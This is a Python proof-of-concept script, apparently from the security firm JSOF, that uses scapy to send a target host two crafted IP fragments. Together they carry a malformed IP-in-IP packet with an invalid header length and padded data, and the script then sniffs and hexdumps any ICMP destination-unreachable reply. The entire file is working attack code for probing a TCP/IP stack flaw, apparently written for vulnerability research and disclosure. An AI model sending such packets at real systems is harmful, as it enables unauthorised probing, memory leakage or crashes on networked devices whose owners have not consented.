'''/*******************************************************
 * Copyright (C) 2019-2020 JSOF LTD info@jsof-tech.com>
 * 
 * 
 * this poc can not be copied and/or distributed and/or modified without the express
 * permission of Shlomi Oberman, JSOF 
 * Unauthorized copying of this file, via any medium is strictly prohibited
 *
 * Proprietary and confidential
 *
*******************************************************/
'''
from scapy.all import *
import argparse
from common import iface_win_index_to_description

def main(iface, ip_dst, timeout):
    print("[*] Sending malformed ipip packet that would generate ICMP error...")

    iplen = 100
    encap_packet = IP(ihl=0xf, dst=ip_dst, len=iplen)
    encap_packet /= (b'\x00'*40)
    encap_packet /= (b'A'*iplen)
    
    frag1 = IP(dst=ip_dst, frag=0, flags=1, proto=4, id=0)
    frag1_data_len = 24
    frag1_data = bytes(encap_packet)[:frag1_data_len]
    frag1 /= frag1_data

    frag2 = IP(dst=ip_dst, frag=(frag1_data_len>>3), flags=0, proto=4, id=0)
    frag2 /= bytes(encap_packet)[frag1_data_len:]

    send(frag1, iface=iface)
    send(frag2, iface=iface)
    sniffed = sniff(timeout=timeout, iface=iface)
    for pkt in sniffed:
        if ICMP in pkt and pkt[ICMP].type == 3:
            print("\t-> Got dest unreachable from {}".format(pkt[IP].src))
            hexdump(pkt[ICMP])
            break
        if ICMP in pkt:
            print("\t[{}]".format(pkt.summary()))

if __name__ == '__main__':
    conf.verb = 0 # make scapy silent

    parser = argparse.ArgumentParser()
    parser.add_argument('ip_dst', help="destination IP address")
    parser.add_argument('-t', '--timeout', type=int, default=3, help="packet sniffing timeout (for the response)")
    parser.add_argument('-i', '--iface', default=None, nargs='?',
                        help="interface name as shown in scapy's show_interfaces() function")
    parser.add_argument('-og', '--override-gateway', dest='gw', default=None, const='use_ip_dst', type=str, nargs='?',
                        help='override gateway for ip_dst in scapy routing table')
    args = parser.parse_args()

    gw = None
    if args.gw:
        if args.gw == 'use_ip_dst':
            gw = args.ip_dst
        else:
            gw = args.gw
    if gw:
        conf.route.add(host=(args.ip_dst), gw=gw)

    iface = args.iface
    if iface is not None and iface.isdigit():
        iface = iface_win_index_to_description(int(iface))

    main(iface, args.ip_dst, args.timeout)